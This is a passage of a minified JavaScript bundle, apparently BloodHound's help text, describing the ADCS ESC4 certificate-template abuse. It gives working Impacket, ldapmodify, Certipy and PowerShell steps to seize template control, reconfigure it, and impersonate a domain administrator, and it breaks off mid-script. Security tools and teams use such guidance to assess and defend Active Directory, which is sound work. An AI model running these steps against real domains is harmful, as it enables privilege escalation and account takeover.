/ptt"})]}),Ga={general:Oa,windowsAbuse:$a,linuxAbuse:Ra,opsec:Ea,references:Ia,composition:Da},Na=({sourceName:r,sourceType:a})=>{const o=J();return e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",className:o.containsCodeEl,children:[E(a,r)," has the privileges to perform the ADCS ESC4 attack against the target domain.",e.jsx("br",{}),e.jsx("br",{}),"The principal has permissions to modify the settings on one or more certificate templates, enabling the principal configure the certificate templates for ADCS ESC1 conditions, which allows them to specify an alternate subject name and use the certificate for authentication. They also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup lets the principal modify the certificate templates to allow enrollment as any targeted AD forest user or computer without knowing their credentials, and impersonation of those targets by certificate authentication."]})})},Ma=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 0.1: "}),"Obtain ownership (WriteOwner only)",e.jsx("br",{}),e.jsx("br",{}),"If you only have WriteOwner on the affected certificate template, then you need to grant your principal ownership over the template first.",e.jsx("br",{}),e.jsx("br",{}),"To check the current owner of the certificate template, you may use Impacket's owneredit:"]}),e.jsx(w,{children:"owneredit.py -action read -target-dn 'template-dn' 'domain'/'attacker':'password'"}),e.jsx(t,{variant:"body2",children:"Change the ownership of the object:"}),e.jsx(w,{children:"owneredit.py -action write -new-owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'"}),e.jsxs(t,{variant:"body2",children:["Confirm that the ownership was changed by running the first command again.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, set the ownership back to previous owner using the second command."]})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 0.2: "}),"Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)",e.jsx("br",{}),e.jsx("br",{}),"If you only have WriteOwner, Owns, or WriteDacl on the affected certificate template, then you need to grant your principal GenericAll over the template.",e.jsx("br",{}),e.jsx("br",{}),"Impacket's dacledit can be used for that purpose:"]}),e.jsx(w,{children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'"}),e.jsx(t,{variant:"body2",children:"Confirm that the GenericAll ACE was added:"}),e.jsx(w,{children:"dacledit.py -action 'read' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'"}),e.jsx(t,{variant:"body2",children:"After abuse, remove the GenericAll ACE you added:"}),e.jsx(w,{children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'"})]}),i=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 1.a: "}),"Make certificate template ESC1 abusable (GenericAll)",e.jsx("br",{}),e.jsx("br",{}),"If you have an GenericAll edge to the CertTemplate node, or if you have just granted yourself GenericAll, then you can use this step to make the template abuseable to ESC1.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy to overwrite the configuration of the certificate template to make it vulnerable to ESC1:"]}),e.jsx(w,{children:"certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old"}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["The ",e.jsx("code",{children:"-save-old"})," parameter is used to save the old configuration, which is used afterward for restoring the configuration:"]}),e.jsx(w,{children:"certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json"}),e.jsxs(t,{variant:"body2",children:["Restoring the configuration is vital as the the vulnerable configuration grants Full Control to Authenticated Users.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template is now vulnerable to the ESC1 technique and you can continue to Step 2."]})]}),s=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1.b: "}),"Ensure the certificate template requires enrollee to specify Subject Alternative Name (SAN)(GenericWrite or WritePKINameFlag, no GenericAll).",e.jsx("br",{}),e.jsx("br",{}),"The certificate template requires the enrollee to specify SAN if the CertTemplate node's"," ",e.jsx("em",{children:"Enrollee Supplies Subject"})," (",e.jsx("code",{children:"enrolleesuppliessubject"}),") is set to True. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"If you have an GenericWrite or WritePKINameFlag edge to the CertTemplate node and no GenericAll permission, then use this step to set the ",e.jsx("code",{children:"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"})," flag.",e.jsx("br",{}),e.jsx("br",{}),"Check the current value of the ",e.jsx("code",{children:"msPKI-Certificate-Name-Flag"})," attribute on the certificate template using ldapsearch and note it down for later:"]}),e.jsx(w,{children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Name-Flag`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["Set the ",e.jsx("code",{children:"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"})," flag as the only enabled flag using ldapmodify:"]}),e.jsx(w,{children:`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Name-Flag\\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}),e.jsxs(t,{variant:"body2",children:["Run the first command again to confirm the attribute has been set.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, set the attribute back to the original value by running the command that sets the value, but with the original value instead of 1."]})]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1.c: "}),"Ensure the certificate template does not require manager approval (GenericWrite or WritePKIEnrollmentFlag, no GenericAll).",e.jsx("br",{}),e.jsx("br",{}),"The certificate template does not require manager approval if the CertTemplate node's"," ",e.jsx("em",{children:"Requires Manager Approval"})," (",e.jsx("code",{children:"requiresmanagerapproval"}),") is set to False. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"If you have an GenericWrite or WritePKIEnrollmentFlag edge to the CertTemplate node and no GenericAll permission, then use this step to remove the ",e.jsx("code",{children:"CT_FLAG_PEND_ALL_REQUESTS"})," flag (manager approval).",e.jsx("br",{}),e.jsx("br",{}),"Check the current value of the ",e.jsx("code",{children:"msPKI-Enrollment-Flag"})," attribute on the certificate template using ldapsearch and note it down for later:"]}),e.jsx(w,{children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Enrollment-Flag`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["Remove all flags from ",e.jsx("code",{children:"msPKI-Enrollment-Flag"})," using ldapmodify:"]}),e.jsx(w,{children:`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Enrollment-Flag\\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}),e.jsxs(t,{variant:"body2",children:["Run the first command again to confirm the attribute has been set.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, set the attribute back to the original value by running the command to set the value, but with the original value instead of 0."]})]}),d=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1.d: "}),"Ensure the certificate template allows for client authentication (GenericWrite, no GenericAll).",e.jsx("br",{}),e.jsx("br",{}),"The certificate template allows for client authentication if the CertTemplate node's"," ",e.jsx("em",{children:"Authentication Enabled"})," (",e.jsx("code",{children:"authenticationenabled"}),") is set to True. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"If you have an GenericWrite edge to the CertTemplate node and no GenericAll permission, then use this step to ensure the certificate template allows for client authentication.",e.jsx("br",{}),e.jsx("br",{}),"Check the current value of the ",e.jsx("code",{children:"msPKI-Certificate-Application-Policy"})," and"," ",e.jsx("code",{children:"pKIExtendedKeyUsage"})," attribute on the certificate template using ldapsearch and note it down for later:"]}),e.jsx(w,{children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Application-Policy`}),e.jsx(w,{children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" pKIExtendedKeyUsage`}),e.jsx(t,{variant:"body2",children:"Set the Client Authentication EKU using ldapmodify:"}),e.jsx(w,{children:`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Application-Policy\\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}),e.jsx(w,{children:`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: pKIExtendedKeyUsage\\npKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}),e.jsxs(t,{variant:"body2",children:["Run the first two command again to confirm the attributes have been set.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, set the attributes back to the original value by running the commands to set the values, but with the original values instead. To set multiple EKUs, use this format:"]}),e.jsx(w,{children:`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: ATTRIBUTE\\nATTRIBUTE: EKU1\\nATTRIBUTE: EKU2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`})]}),h=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1.e: "}),"Ensure the certificate template does not require authorized signatures (GenericWrite, no GenericAll).",e.jsx("br",{}),e.jsx("br",{}),"The certificate template does not require authorized signatures if the CertTemplate node's"," ",e.jsx("em",{children:"Authorized Signatures Required"})," (",e.jsx("code",{children:"authorizedsignatures"}),") is set to 0 or if the"," ",e.jsx("em",{children:"Schema Version"})," (",e.jsx("code",{children:"schemaversion"}),") is 1. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"If you have an GenericWrite edge to the CertTemplate node and no GenericAll permission, then use this step to ensure the certificate template does not require authorized signatures.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template requires authorized signatures if the certificate template's"," ",e.jsx("code",{children:"msPKI-RA-Signature"}),"attribute value is more than zero. Check the current value of the ",e.jsx("code",{children:"msPKI-RA-Signature"})," ","attribute on the certificate template using ldapsearch and note it down for later:"]}),e.jsx(w,{children:`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-RA-Signature`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["Remove all flags from ",e.jsx("code",{children:"msPKI-RA-Signature"})," using ldapmodify:"]}),e.jsx(w,{children:`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-RA-Signature\\nmsPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}),e.jsxs(t,{variant:"body2",children:["Run the first command again to confirm the attribute has been set.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, set the attribute back to the original value by running the command that sets the value, but with the original value instead of 0."]})]}),u=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 2: "}),"Enroll certificate.",e.jsx("br",{}),e.jsx("br",{}),"Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:"]}),e.jsx(w,{children:"certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local"})]}),m=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 3: "}),"Authenticate using certificate.",e.jsx("br",{}),e.jsx("br",{}),"Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 2 and the IP of a domain controller:"]}),e.jsx(w,{hideWrap:!0,children:"certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"})]});return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"An attacker may perform the ESC4 attack with the following steps."}),a,o,i,s,c,d,h,u,m]})},La=()=>e.jsx(t,{variant:"body2",children:"When the affected certificate authority issues the certificate to the attacker, it will retain a local copy of that certificate in its issued certificates store. Defenders may analyze those issued certificates to identify illegitimately issued certificates and identify the principal that requested the certificate, as well as the target identity the attacker is attempting to impersonate."}),Fa=()=>{const r=[{label:"Steal or Forge Authentication Certificates",link:"https://attack.mitre.org/techniques/T1649/"},{label:"Vulnerable Certificate Template Access Control - ESC4",link:"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-template-access-control-esc4"},{label:"Certified Pre-Owned - Abusing Active Directory Certificate Services",link:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"},{label:"Certipy",link:"https://github.com/ly4k/Certipy"},{label:"Certify",link:"https://github.com/GhostPack/Certify"},{label:"Impacket",link:"https://github.com/fortra/impacket"},{label:"Rubeus",link:"https://github.com/GhostPack/Rubeus"}];return e.jsx(l,{sx:{overflowX:"auto"},children:r.map(a=>e.jsxs(be.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:a.link,children:a.label}),e.jsx("br",{})]},a.link))})},_a=()=>{const r=J(),a=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 0.1: "}),"Obtain ownership (WriteOwner only)",e.jsx("br",{}),e.jsx("br",{}),"If you only have WriteOwner on the affected certificate template, then you need to grant your principal ownership over the template.",e.jsx("br",{}),e.jsx("br",{}),"Use the following PowerShell snippet to check the current ownership on the certificate template:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Print the owner
                $acl = $template.psbase.ObjectSecurity
                $acl.Owner`}),e.jsx(t,{variant:"body2",children:"Use the following PowerShell snippet to grant the principal ownership on the certificate template:"}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Set owner
                $acl = $template.psbase.ObjectSecurity
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $acl.SetOwner($account)
                $template.psbase.CommitChanges()`}),e.jsxs(t,{variant:"body2",children:["Confirm that the ownership was changed by running the first script again",e.jsx("br",{}),e.jsx("br",{}),"After abuse, set the ownership back to previous owner using the second script."]})]}),o=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Step 0.2: "}),"Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)",e.jsx("br",{}),e.jsx("br",{}),"If you only have WriteOwner, Owns, or WriteDacl on the affected certificate template, then you need to grant your principal GenericAll over the template.",e.jsx("br",{}),e.jsx("br",{}),"Use the following PowerShell snippet to grant the principal GenericAll on the certificate template:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                    [System.Security.AccessControl.AccessControlType]::Allow
                )
                
                # Add the new ACE to the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.AddAccessRule($ace)
                $template.psbase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:"Confirm that the GenericAll ACE was added:"}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Print ACEs granted to the principal
                $acl = $template.psbase.ObjectSecurity
                $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}),e.jsx(t,{variant:"body2",children:"After abuse, remove the GenericAll ACE you added:"}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $principalName = "principal"     # SAM account name of principal
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                
                # Construct the ACE
                $account = New-Object System.Security.Principal.NTAccount($principalName)
                $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                    $sid,
                    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                    [System.Security.AccessControl.AccessControlType]::Allow
                )
                
                # Remove the ACE from the ACL
                $acl = $template.psbase.ObjectSecurity
                $acl.RemoveAccessRuleSpecific($ace)
                $template.psbase.CommitChanges()`})]}),i=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 1: "}),"Ensure the certificate template allows for client authentication.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template allows for client authentication if the CertTemplate node's"," ",e.jsx("em",{children:"Authentication Enabled"})," (",e.jsx("code",{children:"authenticationenabled"}),") is set to True. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"Use the following PowerShell snippet to check the values of the ",e.jsx("code",{children:"pKIExtendedKeyUsage"})," and ",e.jsx("code",{children:"msPKI-Certificate-Application-Policy"})," attributes of the certificate template:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Print attributes
                Write-Host "pKIExtendedKeyUsage: $($template.Properties["pKIExtendedKeyUsage"])"
                Write-Host "msPKI-Certificate-Application-Policy: $($template.Pro`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["To run the LDAP query as another principal, replace ",e.jsx("code",{children:"DirectoryEntry($ldapPath)"})," with"," ",e.jsx("code",{children:"DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)"})," to specify the credentials of the principal.",e.jsx("br",{}),e.jsx("br",{}),"Add the Client Authentication EKU:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Add EKU to attributes
                $template.Properties["pKIExtendedKeyUsage"].Add($eku) | Out-Null
                $template.Properties["msPKI-Certificate-Application-Policy"].Add($eku) | Out-Null
                $template.CommitChanges()
                $ldap.Close()`}),e.jsxs(t,{variant:"body2",children:["Run the first PowerShell snippet again to confirm the EKU has been added.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, remove the Client Authentication EKU:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Remove EKU from attributes
                $template.Properties["pKIExtendedKeyUsage"].Remove($eku) | Out-Null
                $template.Properties["msPKI-Certificate-Application-Policy"].Remove($eku) | Out-Null
                $template.CommitChanges()
                $ldap.Close()`}),e.jsx(t,{variant:"body2",children:"Verify the EKU has been removed using the first PowerShell snippet."})]}),s=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 2: "}),"Ensure the certificate template requires enrollee to specify Subject Alternative Name (SAN).",e.jsx("br",{}),e.jsx("br",{}),"The certificate template requires the enrollee to specify SAN if the CertTemplate node's"," ",e.jsx("em",{children:"Enrollee Supplies Subject"})," (",e.jsx("code",{children:"enrolleesuppliessubject"}),") is set to True. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template requires the enrollee to specify SAN if the"," ",e.jsx("code",{children:"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"})," flag is enabled in the certificate template's"," ",e.jsx("code",{children:"msPKI-Certificate-Name-Flag"})," attribute. Use the following PowerShell snippet to check the value of the ",e.jsx("code",{children:"msPKI-Certificate-Name-Flag"})," attribute of the certificate template and its enabled flags:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name

                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                $msPKICertificateNameFlag = $template.Properties["msPKI-Certificate-Name-Flag"]
                $ldap.Close()
                
                # Print attribute value and enabeld flags
                $flagTable = @{
                    0x00000001 = "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"
                    0x00010000 = "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME"
                    0x00400000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS"
                    0x00800000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_SPN"
                    0x01000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID"
                    0x02000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_UPN"
                    0x04000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL"
                    0x08000000 = "CT_FLAG_SUBJECT_ALT_REQUIRE_DNS"
                    0x10000000 = "CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN"
                    0x20000000 = "CT_FLAG_SUBJECT_REQUIRE_EMAIL"
                    0x40000000 = "CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME"
                    0x80000000 = "CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH"
                    0x00000008 = "CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME"
                }
                Write-Host "msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag"
                foreach ($flag in $flagTable.Keys) {
                    if ($msPKICertificateNameFlag.ToString() -band $flag) {
                        Write-Host "0x$("{0:X8}" -f $flag) $($flagTable[$flag])"
                    }
                }`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["Flip the ",e.jsx("code",{children:"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"})," flag:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                $flagToFlip = 0x00000001         # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                
                # Flip flag
                $curValue = $template.Properties["msPKI-Certificate-Name-Flag"].Value
                $template.Properties["msPKI-Certificate-Name-Flag"].Value = $curValue -bxor $flagToFlip
                $template.CommitChanges()
                $ldap.Close()`}),e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:["To run the LDAP query as another principal, replace ",e.jsx("code",{children:"DirectoryEntry($ldapPath)"})," with"," ",e.jsx("code",{children:"DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)"})," to specify the credentials of the principal.",e.jsx("br",{}),e.jsx("br",{}),"Run the first PowerShell snippet again to confirm the ",e.jsx("code",{children:"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"})," ","flag has been enabled.",e.jsx("br",{}),e.jsx("br",{}),"After abuse, remove the flag by running the script that flips the flag once again."]})]}),c=e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",className:r.containsCodeEl,children:[e.jsx("b",{children:"Step 3: "}),"Ensure the certificate template does not require manager approval.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template does not require manager approval if the CertTemplate node's"," ",e.jsx("em",{children:"Requires Manager Approval"})," (",e.jsx("code",{children:"requiresmanagerapproval"}),") is set to False. In that case, continue to the next step.",e.jsx("br",{}),e.jsx("br",{}),"The certificate template requires manager approval if the ",e.jsx("code",{children:"CT_FLAG_PEND_ALL_REQUESTS"})," flag is enabled in the certificate template's ",e.jsx("code",{children:"msPKI-Enrollment-Flag"})," attribute. Use the following PowerShell snippet to check the value of the ",e.jsx("code",{children:"msPKI-Enrollment-Flag"})," attribute of the certificate template and its enabled flags:"]}),e.jsx(w,{children:`$templateName = "TemplateName"   # Use CN, not display name
                
                # Find the certificate template
                $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
                $ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)
                $searcher = New-Object DirectoryServices.DirectorySearcher
                $searcher.SearchRoot = $ldap
                $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                $template = $searcher.FindOne().GetDirectoryEntry()
                $msPKICertificateNameFlag = $template.Properties["msPKI-Enrollment-Flag"]
                $ldap.Close()
                
                # Print attribute value and enabeld flags
                $flagTable = @{
                    0x00000001 = "CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"
                    0x00000002 = "CT_FLAG_PEND_ALL_REQUESTS"
                    0x00000004 = "CT_FLAG_PUBLISH_TO_KRA_CONTAINER"
                    0x00000008 = "CT_FLAG_PUBLISH_TO_DS"
                    0x00000010 = "CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE"
                    0x00000020 = "CT_FLAG_AUTO_ENROLLMENT"
                    0x00000040 = "CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT"
                    0x00000100 = "CT_FLAG_USER_INTERACTION_REQUIRED"
                    0x00000400 = "CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE"
                    0x00000800 = "CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF"
                    0x00001000 = "CT_FLAG_ADD_OCSP_NOCHECK"
                    0x00002000 = "CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL"
                    0x00004000 = "CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS"
                    0x00008000 = "CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS"
                    0x00010000 = "CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT"
                    0x00020000 = "CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST"
                    0x00040000 = "CT_FLAG_SKIP_AUTO_RENEWAL"
                    0x00080000 = "CT_FLAG_NO_SECURITY_EXTENSION"
                }
                Write-Host "msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag"
                foreach ($flag in $flagTable.Keys) {
                    if ($msPKICertificateNameFlag.ToString() -band $flag) {
